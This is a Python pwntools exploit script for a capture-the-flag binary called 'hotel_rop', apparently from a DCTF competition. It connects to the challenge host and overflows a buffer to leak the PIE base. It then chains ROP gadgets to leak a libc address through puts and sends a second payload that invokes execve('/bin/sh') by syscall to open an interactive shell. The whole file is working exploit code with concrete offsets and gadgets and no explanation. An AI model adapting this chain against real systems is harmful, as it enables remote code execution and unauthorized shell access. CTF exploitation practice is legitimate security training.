from pwn import *

#c = process("./hotel_rop")
#gdb.attach(c)
c = remote("dctf1-chall-hotel-rop.westeurope.azurecontainer.io", 7480)

c.recvuntil('street ')
pie = int(c.recv()[:14], 0) - 0x000000000000136d
log.success('pie base:' + hex(pie))
pop_rdi = pie + 0x000000000000140b

payload = b'A'*0x28
payload += p64(pop_rdi)
payload += p64(pie + 0x4018)
payload += p64(pie + 0x0000000000001030)
payload += p64(pie + 0x000000000000136d)

c.sendline(payload)
c.recvuntil("often.\n")
leak = u64(c.recv()[:6] + b'\x00\x00')
libc = leak - 0x0875a0
log.success('leak puts(): ' + hex(leak))
log.success('libc address:' + hex(libc))

payload = b'A'*0x28
payload += p64(libc + 0x0000000000026b72) #pop rdi
payload += p64(libc + 0x1b75aa) # /bin/sh
payload += p64(libc + 0x0000000000027529) #pop rsi
payload += b'\x00'*8
payload += p64(libc + 0x0000000000162865) # pop rax rdx
payload += p64(0x3b)
payload += b'\x00'*16
payload += p64(libc + 0x000000000002584d) # syscall
c.sendline(payload)
c.interactive()
